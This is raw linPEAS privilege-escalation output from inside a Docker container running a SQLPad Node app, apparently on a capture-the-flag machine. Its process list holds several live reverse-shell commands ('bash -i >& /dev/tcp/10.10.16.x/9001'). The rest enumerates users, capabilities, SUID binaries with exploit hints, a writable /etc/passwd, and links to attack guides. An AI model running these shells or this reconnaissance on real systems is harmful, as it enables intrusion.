lrwxrwxrwx 1 root root 0 Sep 24 09:41 cgroup -> cgroup:[4026532680]
lrwxrwxrwx 1 root root 0 Sep 24 09:41 ipc -> ipc:[4026532593]
lrwxrwxrwx 1 root root 0 Sep 24 09:41 mnt -> mnt:[4026532591]
lrwxrwxrwx 1 root root 0 Sep 24 09:41 net -> net:[4026532595]
lrwxrwxrwx 1 root root 0 Sep 24 09:41 pid -> pid:[4026532594]
lrwxrwxrwx 1 root root 0 Sep 24 09:41 pid_for_children -> pid:[4026532594]
lrwxrwxrwx 1 root root 0 Sep 24 09:41 time -> time:[4026531834]
lrwxrwxrwx 1 root root 0 Sep 24 09:41 time_for_children -> time:[4026531834]
lrwxrwxrwx 1 root root 0 Sep 24 09:41 user -> user:[4026531837]
lrwxrwxrwx 1 root root 0 Sep 24 09:41 uts -> uts:[4026532592]

╔══════════╣ Container Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
CapInh: 0000000000000000
CapPrm: 00000000a00425fb
CapEff: 00000000a00425fb
CapBnd: 00000000a00425fb
CapAmb: 0000000000000000
Run capsh --decode=<hex> to decode the capabilities

╔══════════╣ Privilege Mode
Privilege Mode is disabled

╔══════════╣ Interesting Files Mounted
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/L7ZKMJGDPM66AJUMM7OC6R4AMF:/var/lib/docker/overlay2/l/VKDEY6G5NFPWPTGJ7CR42Y3IXX:/var/lib/docker/overlay2/l/PGKS4DZDXD3SDVXKFEFEVRO3XL:/var/lib/docker/overlay2/l/VASNMPQBW2LWLK5R4SANZMAN3V:/var/lib/docker/overlay2/l/BRMVIB4H7ZWJSKBWSXCZG6NQGH:/var/lib/docker/overlay2/l/TDTAZTZTTMIHP4ELLG5TFCVPGQ:/var/lib/docker/overlay2/l/SY7KKADEXBP67CATU6OKQJFEMH:/var/lib/docker/overlay2/l/24CLUQ3NX3M5V742R264CL7LO4:/var/lib/docker/overlay2/l/POC2FH3R7PG2AYOVS4CRB2C5JW:/var/lib/docker/overlay2/l/KRMAYQOJUIV2NXMWQCXF6IONRG:/var/lib/docker/overlay2/l/SUSVG6PVN2JR5B5SDTRKZZSSKO:/var/lib/docker/overlay2/l/AKVKTM4UQL4647ATG2NAYQCCFT,upperdir=/var/lib/docker/overlay2/9d0ce24f13f948e3582b108d503a1ae6025f910f0309225785c43ff85bbfa404/diff,workdir=/var/lib/docker/overlay2/9d0ce24f13f948e3582b108d503a1ae6025f910f0309225785c43ff85bbfa404/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/resolv.conf type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hostname type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hosts type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /var/lib/sqlpad type ext4 (rw,relatime)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime,inode64)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
tmpfs on /proc/scsi type tmpfs (ro,relatime,inode64)
tmpfs on /sys/firmware type tmpfs (ro,relatime,inode64)

╔══════════╣ Possible Entrypoints
-rwxr-xr-x 1 root root 413 Mar 12  2022 /docker-entrypoint



                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
./linpeas.sh: 2214: ./linpeas.sh: check_aliyun_ecs: not found
grep: /etc/cloud/cloud.cfg: No such file or directory
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No
═╣ Aliyun ECS? .......................... 
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
[i] Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
                 thread-self  cat/proc/thread-self//cmdline
                 self      cat/proc/self//cmdline
                 81        bash-i
                 80        /bin/bash-cbash -i >& /dev/tcp/10.10.16.61/9001 0>&1
                 7962      /bin/sh./linpeas.sh
                 79        /bin/sh-c/bin/bash -c "bash -i >& /dev/tcp/10.10.16.61/9001 0>&1"
                 29        bash-i
                 28        /bin/bash-cbash -i >& /dev/tcp/10.10.16.12/9001 0>&1
                 27        /bin/sh-c/bin/bash -c "bash -i >& /dev/tcp/10.10.16.12/9001 0>&1"
                 26        bash-i
                 25        /bin/bash-cbash -i >& /dev/tcp/10.10.16.12/9001 0>&1
                 24        /bin/sh-c/bin/bash -c "bash -i >& /dev/tcp/10.10.16.12/9001 0>&1"
                 10801     /bin/sh./linpeas.sh
                 10798     seds,amazon-ssm-agent|knockd|splunk,&,
                 10796     seds,root,&,
                 10795     seds,root,&,
                 10791     sort-r
                 10789     /bin/sh./linpeas.sh
                 10786     /bin/sh./linpeas.sh
                 1         node/usr/app/server.js

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
total 1004

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
crontab Not Found
incrontab Not Found
/etc/cron.daily:
total 24
drwxr-xr-x 2 root root 4096 Feb 28  2022 .
drwxr-xr-x 1 root root 4096 Aug  6 11:23 ..
-rwxr-xr-x 1 root root 1478 Apr 19  2021 apt-compat
-rwxr-xr-x 1 root root 1187 Apr 19  2019 dpkg
-rwxr-xr-x 1 root root  249 Sep 27  2017 passwd

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/lib/systemd/system/apt-daily-upgrade.service is calling this writable executable: /usr/lib/apt/apt-helper
/lib/systemd/system/apt-daily.service is calling this writable executable: /usr/lib/apt/apt-helper
/lib/systemd/system/fstrim.service is calling this writable executable: /sbin/fstrim
You can't write on systemd PATH

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
busctl Not Found
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus



                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces
Inter-|   Receive                                                |  Transmit
 face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed
    lo:     400       8    0    0    0     0          0         0      400       8    0    0    0     0       0          0
  eth0: 4631375   26951    0    0    0     0          0         0 22916698   19687    0    0    0     0       0          0
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.17.0.0/16 2 0 2
        +-- 172.17.0.0/30 2 0 2
           |-- 172.17.0.0
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
        |-- 172.17.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.17.0.0/16 2 0 2
        +-- 172.17.0.0/30 2 0 2
           |-- 172.17.0.0
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
        |-- 172.17.255.255
           /32 link BROADCAST

╔══════════╣ Hostname, hosts and DNS
c184118df0a6
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	c184118df0a6

search .

nameserver 8.8.8.8
nameserver 8.8.4.4

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=0(root) gid=0(root) groups=0(root)

╔══════════╣ Do I have PGP keys?
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

./linpeas.sh: 3390: ./linpeas.sh: get_current_user_privot_pid: not found
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
michael:x:1001:1001::/home/michael:/bin/bash
node:x:1000:1000::/home/node:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(node) gid=1000(node) groups=1000(node)
uid=1001(michael) gid=1001(michael) groups=1001(michael)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now

╔══════════╣ Last logons

wtmp begins Wed May 15 04:40:37 2024

╔══════════╣ Last time logon each user
Username         Port     From             Latest

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/perl
/usr/bin/wget

╔══════════╣ Installed Compilers

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
-rw-r--r-- 1 root root 1977 Mar 12  2022 /usr/app/docker-compose.yml
-rw-r--r-- 1 root root 183 Mar 12  2022 /usr/app/drivers/cassandra/docker-compose.yml
-rw-r--r-- 1 root root 109 Mar 12  2022 /usr/app/drivers/clickhouse/docker-compose.yml
-rw-r--r-- 1 root root 128 Mar 12  2022 /usr/app/drivers/crate/docker-compose.yml
-rw-r--r-- 1 root root 110 Mar 12  2022 /usr/app/drivers/drill/docker-compose.yml
-rw-r--r-- 1 root root 598 Mar 12  2022 /usr/app/drivers/hdb/docker-compose.yml
-rw-r--r-- 1 root root 223 Mar 12  2022 /usr/app/drivers/mysql/docker-compose.yml
-rw-r--r-- 1 root root 223 Mar 12  2022 /usr/app/drivers/mysql2/docker-compose.yml
-rw-r--r-- 1 root root 135 Mar 12  2022 /usr/app/drivers/pinot/docker-compose.yml
-rw-r--r-- 1 root root 200 Mar 12  2022 /usr/app/drivers/postgres/docker-compose.yml
-rw-r--r-- 1 root root 104 Mar 12  2022 /usr/app/drivers/presto/docker-compose.yml
-rw-r--r-- 1 root root 200 Mar 12  2022 /usr/app/drivers/redshift/docker-compose.yml
-rw-r--r-- 1 root root 243 Mar 12  2022 /usr/app/drivers/sqlserver/docker-compose.yml
-rw-r--r-- 1 root root 92 Mar 12  2022 /usr/app/drivers/trino/docker-compose.yml
-rw-r--r-- 1 root root 99 Mar 12  2022 /usr/app/drivers/vertica/docker-compose.yml
-rw-r--r-- 1 root root 156 Mar 12  2022 /usr/app/node_modules/ldapjs/docker-compose.yml
-rwxr-xr-x 1 root root 2627 Mar 12  2022 /usr/app/node_modules/sqlite3/Dockerfile
-rwxr-xr-x 1 root root 2494 Mar 12  2022 /usr/app/node_modules/sqlite3/tools/docker/architecture/linux-arm/Dockerfile
-rwxr-xr-x 1 root root 2531 Mar 12  2022 /usr/app/node_modules/sqlite3/tools/docker/architecture/linux-arm64/Dockerfile

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 28  2022 /etc/pam.d


╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 28  2022 /usr/share/keyrings




╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/@azure/identity/node_modules/events/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/@azure/storage-blob/node_modules/events/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/available-typed-arrays/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/aws4/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/balanced-match/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/call-bind/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/clickhouse/node_modules/qs/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/connect-redis/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/deep-equal/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/es-get-iterator/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/es-to-primitive/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/express-pino-logger/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/fast-json-stable-stringify/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/fast-redact/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/get-intrinsic/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/get-symbol-description/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/has-bigints/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/has-symbols/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/has-tostringtag/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/internal-slot/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-arguments/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-bigint/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-boolean-object/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-callable/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-date-object/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-map/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-negative-zero/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-number-object/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-set/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-shared-array-buffer/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-string/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-symbol/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-typed-array/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/is-weakmap/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-weakref/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/is-weakset/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/kruptein/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/ldapjs/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/mariadb/node_modules/iconv-lite/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/moment-timezone/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/mysql2/node_modules/iconv-lite/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/object-inspect/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/object.assign/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/on-exit-leak-free/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/papaparse/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/passport-google-oauth20/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/passport-ldapauth/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/passport-oauth2/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/pino-abstract-transport/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/pino-http/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/pino-std-serializers/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/pino/node_modules/pino-std-serializers/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/please-upgrade-node/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/process-warning/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/qs/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/quick-format-unescaped/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/requestretry/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/rfdc/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/side-channel/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/snowflake-sdk/node_modules/https-proxy-agent/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/sqlite3/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/tedious/node_modules/iconv-lite/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/thread-stream/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/unbox-primitive/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/which-boxed-primitive/.github
drwxr-xr-x 3 root root 4096 Mar 12  2022 /usr/app/node_modules/which-collection/.github
drwxr-xr-x 2 root root 4096 Mar 12  2022 /usr/app/node_modules/which-typed-array/.github
drwxr-xr-x 3 root root 4096 Feb  8  2022 /usr/local/lib/node_modules/npm/node_modules/node-gyp/.github
drwxr-xr-x 3 root root 4096 Feb  8  2022 /usr/local/lib/node_modules/npm/node_modules/node-gyp/gyp/.github




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 michael michael 3526 Apr 18  2019 /home/michael/.bashrc
-rw-r--r-- 1 node node 3526 Apr 18  2019 /home/node/.bashrc
-rw-r--r-- 1 root root 570 Jan 31  2010 /root/.bashrc





-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 michael michael 807 Apr 18  2019 /home/michael/.profile
-rw-r--r-- 1 node node 807 Apr 18  2019 /home/node/.profile
-rw-r--r-- 1 root root 148 Aug 17  2015 /root/.profile






╔══════════╣ Analyzing PGP-GPG Files (limit 70)
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 8700 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 7443 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw------- 1 root root 1200 Mar  2  2022 /root/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 8700 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 55625 Mar 16  2021 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 36873 Mar 16  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 7443 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg

drwx------ 1 root root 4096 Mar  2  2022 /root/.gnupg

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd

╔══════════╣ Searching ssl/ssh files
══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/CFCA_EV_ROOT.pem
/etc/ssl/certs/COMODO_Certification_Authority.pem
/etc/ssl/certs/COMODO_ECC_Certification_Authority.pem
7962PSTORAGE_CERTSBIN


./linpeas.sh: 4789: ./linpeas.sh: ps: not found



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 51K Jan 10  2019 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jan 10  2019 /bin/su
-rwsr-xr-x 1 root root 35K Jan 10  2019 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root tty 35K Jan 10  2019 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
══╣ Current shell capabilities
CapInh:	0000000000000000
CapPrm:	00000000a00425fb
CapEff:	00000000a00425fb
CapBnd:	00000000a00425fb
CapAmb:	0000000000000000

══╣ Parent proc capabilities
CapInh:	0000000000000000
CapPrm:	00000000a00425fb
CapEff:	00000000a00425fb
CapBnd:	00000000a00425fb
CapAmb:	0000000000000000


Files with capabilities (limited to 50):

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable
═╣ Credentials in fstab/mtab? ........... No
